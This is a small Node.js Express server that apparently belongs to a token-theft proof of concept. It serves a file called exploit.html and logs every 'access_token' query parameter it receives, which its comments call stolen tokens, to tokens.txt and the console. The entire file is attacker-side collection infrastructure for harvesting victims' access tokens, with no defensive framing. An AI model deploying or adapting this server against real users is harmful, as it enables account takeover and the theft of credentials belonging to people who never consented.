const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Route to serve exploit.html
app.get('/exploit', (req, res) => {
    res.sendFile(path.join(__dirname, 'exploit.html'));
});

// Log stolen token if present
app.get('/', (req, res) => {
    if (req.query.access_token) {
        const log = `[${new Date().toISOString()}] Token: ${req.query.access_token}\n`;
        fs.appendFileSync('tokens.txt', log);
        console.log(log);
    }
    res.send('Token received (if present).');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
